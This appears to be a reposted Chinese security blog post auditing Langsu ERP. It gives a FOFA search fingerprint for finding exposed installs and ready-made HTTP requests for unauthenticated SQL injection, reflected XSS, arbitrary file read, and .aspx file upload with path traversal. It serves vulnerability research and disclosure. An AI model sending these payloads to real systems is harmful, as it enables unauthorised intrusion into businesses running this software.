---
title: 代码审计 | 朗速ERP漏洞分析
url: https://mp.weixin.qq.com/s/ucU66FGMsAEScEdl5kbU-A
source: Doonsec's feed
date: 2026-02-14
fetch_date: 2026-02-15T04:19:16.637790
---

# 代码审计 | 朗速ERP漏洞分析

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/99OCEp0Lz4TcTafmIte9JrtokplM1e1wO932ofHJvh7UTpGqk5V1WpBfNFBGR0j73Ko6shAruPQicOeia9SnaRFHdbPYD7QpDOlQTiaGlCeddM/0?wx_fmt=jpeg)

# 代码审计 | 朗速ERP漏洞分析

sec0nd安全

![]()

在小说阅读器中沉浸阅读

以下文章来源于学安全的猪
，作者学安全的猪

![](http://wx.qlogo.cn/mmhead/B2EfAOZfS1ia4fRYWw9D9j2iaNdaGWzaico0LD5VUY57OaCp9S8AWnybeQVXqNqW65dico3YATZ7aicA/0)

**学安全的猪**
.

学安全的猪，专注于网络安全学习

概述

朗速ERP存在SQL注入、XSS、任意文件读取、任意文件上传等漏洞。

```
fofa: body="/Resource/Scripts/Yw/Yw_Bootstrap.js"
```

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4QphAkibMuPcvLm72gISFPb70CbYfRwYTGGddnT2MIyyCo3qlZegIQ2xnvU9lYGrNqLKDd6H8pLoHev0DTQicmAwUwCD3UcHKkTg/640?wx_fmt=png&from=appmsg)

SQL注入漏洞

SQL注入1，Api/DataInterfaceApi.ashx对应的dll文件为bin/Lskj.Data.Api.dll，使用ILSpy反编译，DataInterfaceApi类的SyncData()方法无鉴权，接收apiNo和repeaterUrl两个参数，当repeaterUrl为空时会调用DataInterface().UpdateLserpData()方法；

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4TJzStyHlTPDmgpE6ShCENpib2DzaYFsad8FYoSfPxDw1maoW5cwsgRU3LITXQ9OJibicVCm4mH4KOwnKQKqcIq6VPlFc9cHib8iaUY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4TxdkxV2wTuN2uo1tLTc4ev4H62TKlEeHWAVv6ko7ibRxB1YFgCic4WglOrD64ByicdFacqV34v0k6ga8RCjWXzMnOyQqRs5Lt1iaY/640?wx_fmt=png&from=appmsg)

在DataInterface().UpdateLserpData()方法中，apiNo参数被直接拼接到sql语句中执行，存在SQL注入漏洞；

```
POST /Api/DataInterfaceApi.ashx HTTP/1.1Host: x.x.x.xContent-Type: application/x-www-form-urlencodedContent-Length: 72
method=SyncData&repeaterUrl=&data=1&apiNo=1'+end;WAITFOR+DELAY'0:0:5'--+
```

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4QPwkEARnIlqKXJoGxMQQPS880nZPM9IZxfAPwYg1z9grW1tC7JAYLnuZ21EWTQZJHsZczDCtibJRB0duo8iauwID5cuxp863HRg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4RT52Ugicak8TMLg3vUhiamE1N8StuOzC2GNwhYbJ9kkCdbb4kW77XaDt7kdL7NcIIgmUwVgx5rDcq4oZ5XKbcLubyeQ2kAoF2Co/640?wx_fmt=png&from=appmsg)

SQL注入2，Api/ModuleAjaxApi.ashx对应Lskj.WebErp.Core.dll，其GetFlowChartOption()方法未鉴权接收ModuleId,ModuleType,billType三个参数，billType参数被传入moduleImpl.GetFlowChartOption()方法中，接着传入了base.dataImpl.GetFlowChartOption()方法；

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4SDvZS77tAWU6p5raibrQIyFCwDic1nY4cjiaLjuglcFILljicv4ENDYsfIEt1KcfMMontuSP7JibGiccOibwiaGFFXp5gMsbZbJUhEFmg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4SFlzicVoADcwZI7Z3sNia15hkIn0pnibic5UXGVl9EIF75UjN3B81CkZsBviaEqdm1FPMoKHlJ7S3Hwgr4AQtpkdsfpCrLH3NFtmxA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4R5ib3yLU62BZgjaTIvVP8wvkMZmnJBFk0yldMibtPL90icbIENPIleuRfrrOf31rib00bqDR2Zf8D8zHGGZrQ2U1ORjsRR5feT4Ns/640?wx_fmt=png&from=appmsg)

在base.dataImpl.GetFlowChartOption()方法billType和ModuleId参数使用字符串插值$""拼接到SQL语句中，存在SQL注入漏洞；

```
POST /Api/ModuleAjaxApi.ashx HTTP/1.1Host: x.x.x.xContent-Type: application/x-www-form-urlencodedContent-Length: 84
method=GetFlowChartOption&ModuleId=1&ModuleType=0&billType=1'WAITFOR+DELAY'0:0:3'--+
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4ToWJMnyclfhfJkYCnXmW7o57U54f6nkv4WicPmiarbLaPibeQKZFuBDriax7CPPABQXrzZUT6Yia3KGObA65czGNqIpFbELP3usBO4/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4Qvkibhr3MJ2CKxTfzHwV9X3Je00eNR7S42TDXzEicUgKs34zAQPJSNEU8rBb7zc5ibbbmbGSTreM3LBZtRUKUKAyK6lUcL3wMyp0/640?wx_fmt=png&from=appmsg)

SQL注入3，还是在Api/ModuleAjaxApi.ashx，另一个无鉴权的方法 UpdatePartFlowChartOption()，options参数是个json字符串，最终传入base.dataImpl.UpdateFlowChartOption()方法中，其key值被拼接到SQL语句中，或者其它几个参数，存在SQL注入漏洞；

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4SrC9u6rIo2r8sFDiczFfC5RNIPTDahUWLs8xD25OWSkCTeD861G5CyzdhHCLSPrD2lZOL7ibHZp1sjyfcnJY5w6HyMkcCwuQTpA/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4RwsFsibb0bBzNWDYnfF0ibKSmXMpjcxx907nu9T5JC7Ay2ZQfhqpKE4qB85rGwt0qibXGeoVc5ulHkzGdqCbeIBnYYbYSeYDtTJ0/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4TRe1U4EJ5ianhv2Vj5OcJ7AdyFPaFGDGYKlgdbc4lv2mbZuUze5ibd7QDlRuiajO9HbW1qEIhxGv6ZGKL97rfnP5YIhuAT7YC9E4/640?wx_fmt=png&from=appmsg)

```
POST /Api/ModuleAjaxApi.ashx HTTP/1.1Host: x.x.x.xContent-Type: application/x-www-form-urlencodedContent-Length: 109
method=UpdatePartFlowChartOption&ModuleId=1&ModuleType=0&billType=1&options={"1'WAITFOR+DELAY'0:0:3'--+":"1"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4R1XoKQC9BHZWblu06H1zWAWFYbSAS1icNCGRUAdCqIX8XIpI9MngQyV3MqIHxicJGwhlmn5WcW6p4hljiaLR2tQicneuSLghXetcI/640?wx_fmt=png&from=appmsg)

还有其他很多注入点；

XSS漏洞

ImageLoader.aspx如下，接收imgUrl参数拼接到img标签中，存在XSS漏洞；

```
/ImageLoader.aspx?imgUrl=1"onerror="alert('xss')"
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4SHpQlM3FcY6WzEXydE3CAOmYvpYiaicer4AvLotKtBCbibD4DFiaotj3qF4HlZgEzpnJPO76hEOoqGALvM2klYHYo7GS3UP16xBjI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4RzRLMCVVED5Iy4ID26Bfn7ia8yo3x4mZJ0icNWuK4BXW7PPXkiaBWQF9ZiccTeMQbk9cJ6kPCibO8mEHs6tpQ4WDOe8Ta07ro9W840/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4RuI8uqZ2tpZdDmLyKIDfsF9C722sWicGaj37n8AwO2zbzuNnwxfqEwmjom60jicicO8f5mFM1mDtvjI5FEpLoVkR5mEbcNalKicHU/640?wx_fmt=png&from=appmsg)

任意文件读取

在WebDwgDefault.aspx中，当IsSave为false时可读取文件FileName，存在任意文件读取漏洞；

```
/WebDwgDefault.aspx?IsSave=false&FileName=C:/Windows/win.ini
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4SJhPmaAibGaZazicIxoCz6uPX4EZpvSFYZvTKpphNg07aT757Q2ZM0xHl5tyibBjSY8hksv2bJfZN0uGWA7JHgzlICPMMnpb1icjQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4RcqF2auLKxQMMAvic2X22aKvCADKxs0vlyIYYkHAS3xrzsWrW5mthC6Uhvv9MLWnribprXKsAXv7M6NRZemsWstg5WEw3GIRiaRQ/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4Q3qn8Aqk6Tia5jFqqUIgPcFCygROVoM9RM6IiaVdSmQNkmj5If8qhtxFmDnDfNnpBJVibC3GicexDicXaBRODQcguvCtZLmghVcp8M/640?wx_fmt=png&from=appmsg)

任意文件上传

文件上传1，上面那个WebDwgDefault.aspx，当IsSave为true时可上传文件，文件名FileName参数传入、无后缀限制、文件保存在网站目录下，存在任意文件上传漏洞；

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4QNxEiczTqgv86hwSsVLkwoza4wKS0uNSjUkhPfT6OM8Guh6VX8nFt0qnFR0hmDSw7xs5v3wBehMIYJNQ0fPGMdTQHFx1bZABWQ/640?wx_fmt=png&from=appmsg)

```
POST /WebDwgDefault.aspx?IsSave=true&FileName=test.aspx HTTP/1.1Host: x.x.x.xContent-Type: multipart/form-data; boundary=----WebKitFormBoundarydwGFMSgi5b9kDbM0Content-Length: 237
------WebKitFormBoundarydwGFMSgi5b9kDbM0Content-Disposition: form-data; name="file"; filename="1.png"
<%@ Page Language="C#" %><%Response.Write(Guid.NewGuid().ToString());Response.End();%>------WebKitFormBoundarydwGFMSgi5b9kDbM0--
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4QTR2FnibwGpq5iczMXj0iaJ5AjsuibK6yPDhUk0uicyKg4gtlQ7mj6uf7ZAKEjMw0uTXfJqITCibhjqxLKTu0h8ZxPehF1ZPnicDBLpM/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4SKpoQTMYS0ZmrCpbYPZcBAL3y9A2DVdPibptWicE8E9AnZ2aVn2zocMJgvoPXbE8DNrTSa7omfsGkJkiavSO9OdKLu5IYhX2YrAU/640?wx_fmt=png&from=appmsg)

文件上传2，Api/TinyMce/UploadAjaxAPI.ashx对应Lskj.Views.WebErp.dll，可上传aspx后缀文件、非图片后缀的文件保存到/fileRoot/tinymce/otherfile/目录下，文件名直接与保存路径拼接，可以通过 ../ 穿越到网站目录下，存在任意文件上传漏洞；

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4TzcvZrY3wpLlKJaxJiaqGhEqwhIpA4OWt7S1jwjOibsmdibSicXPNMdPzPBnIxMmHiaZReNAvlGAbGfguQ3nJbYMibAaRftEmfdEOeg/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4ScWzH459uBDGXuEnSllhBRnU8FFHyT1UicgrpVrtCvskbhSkFzMbSD8Xqia7iaiaXdc70guMV3zV4891C7tciasYVuf5jTktweSRl4/640?wx_fmt=png&from=appmsg)

```
POST /Api/TinyMce/UploadAjaxAPI.ashx HTTP/1.1Host: x.x.x.xContent-Type: multipart/form-data; boundary=----WebKitFormBoundaryqfHrEc8f5X9KnJUTContent-Length: 253
------WebKitFormBoundaryqfHrEc8f5X9KnJUTContent-Disposition: form-data; name="file"; filename="/../../../../abc.aspx"
<%@ Page Language="C#" %><%Response.Write(Guid.NewGuid().ToString());Response.End();%>------WebKitFormBoundaryqfHrEc8f5X9KnJUT--
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/99OCEp0Lz4RZhYtsNOiaSrgTPL16p0JYmzEFoicicIqE6PXjQqn0C41xeB0CsDuvbiawGaUH9QDAGqNQ9Jl86KDRzOUVh05o0w0dMjAyrlI6CAI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/99OCEp0Lz4RJXcKjGI5le5wIw9IqCE3SOu4PyHvtuQBwKEEuM5nibVqUwEBgIutibIE2ApmK6fTZh...